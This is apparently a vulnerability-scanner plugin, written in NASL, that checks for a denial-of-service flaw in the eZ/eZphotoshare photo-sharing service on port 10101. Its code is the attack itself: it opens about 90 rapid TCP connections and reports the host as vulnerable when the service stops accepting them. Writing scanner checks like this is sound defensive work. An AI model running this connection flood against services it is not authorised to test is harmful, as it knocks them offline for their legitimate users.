# SPDX-FileCopyrightText: 2004 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14682");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11129");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_xref(name:"OSVDB", value:"9728");
  script_name("eZ/eZphotoshare Denial of Service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(10101);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Upgrade to the latest version of this software.");
  script_tag(name:"summary", value:"The remote host runs eZ/eZphotoshare, a service for sharing and exchanging
  digital photos.

  This version is vulnerable to a denial of service attack.");
  script_tag(name:"impact", value:"An attacker could prevent the remote service from accepting requests
  from users by establishing quickly multiple connections from the same host.");

  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

port = 10101;

if( get_port_state( port ) ) {

  soc = open_sock_tcp(port);
  if (! soc) exit(0);

  s[0] = soc;

  #80 connections should be enough, we just add few one :)
  for (i = 1; i < 90; i = i+1)
  {
    soc = open_sock_tcp(port);
    if (! soc)
    {
      security_message(port);
      for (j = 0; j < i; j=j+1) close(s[j]);
    }
    s[i] = soc;
  }
  for (j = 0; j < i; j=j+1) close(s[j]);
}
exit(0);
